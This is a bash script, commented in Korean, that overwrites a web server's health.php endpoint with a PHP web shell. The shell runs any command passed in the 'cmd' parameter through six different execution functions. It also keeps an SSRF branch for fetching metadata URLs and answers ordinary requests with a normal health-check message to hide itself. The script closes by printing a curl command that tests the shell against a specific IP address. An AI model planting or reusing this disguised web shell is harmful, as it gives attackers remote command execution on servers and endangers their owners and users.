#!/bin/bash
###############################################################################
# 모든 PHP 실행 방법 시도하는 웹쉘
###############################################################################

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   다양한 방법으로 웹쉘 생성 중...                         ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# health.php를 강력한 웹쉘로 수정
cat > /var/www/html/www/api/health.php << 'EOFPHP'
<?php
header('Content-Type: text/plain');

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    // 방법 1: system()
    echo "=== Method 1: system() ===\n";
    @system($cmd);
    echo "\n\n";

    // 방법 2: passthru()
    echo "=== Method 2: passthru() ===\n";
    @passthru($cmd);
    echo "\n\n";

    // 방법 3: shell_exec()
    echo "=== Method 3: shell_exec() ===\n";
    $output = @shell_exec($cmd);
    echo $output;
    echo "\n\n";

    // 방법 4: exec()
    echo "=== Method 4: exec() ===\n";
    @exec($cmd, $output_arr);
    echo implode("\n", $output_arr);
    echo "\n\n";

    // 방법 5: popen()
    echo "=== Method 5: popen() ===\n";
    $handle = @popen($cmd, 'r');
    if ($handle) {
        while (!feof($handle)) {
            echo fread($handle, 4096);
        }
        pclose($handle);
    }
    echo "\n\n";

    // 방법 6: proc_open()
    echo "=== Method 6: proc_open() ===\n";
    $descriptorspec = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];
    $process = @proc_open($cmd, $descriptorspec, $pipes);
    if (is_resource($process)) {
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($process);
    }
    echo "\n\n";

} elseif (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    // 기존 SSRF 기능
    $url = $_GET['url'];
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $data = @file_get_contents($url, false, $ctx);
    if ($data !== false) {
        echo $data;
    } else {
        echo "Failed to fetch metadata";
    }
} else {
    // 기본 health check
    echo "OK - Server: " . gethostname() . " - Time: " . date('Y-m-d H:i:s');
}
?>
EOFPHP

echo "[+] 강력한 웹쉘 생성 완료"
echo ""
echo "[*] 테스트:"
echo "    curl 'http://52.79.240.83/api/health.php?cmd=whoami'"
echo ""
echo "[*] 여러 방법 중 하나는 작동할 것입니다!"
echo ""
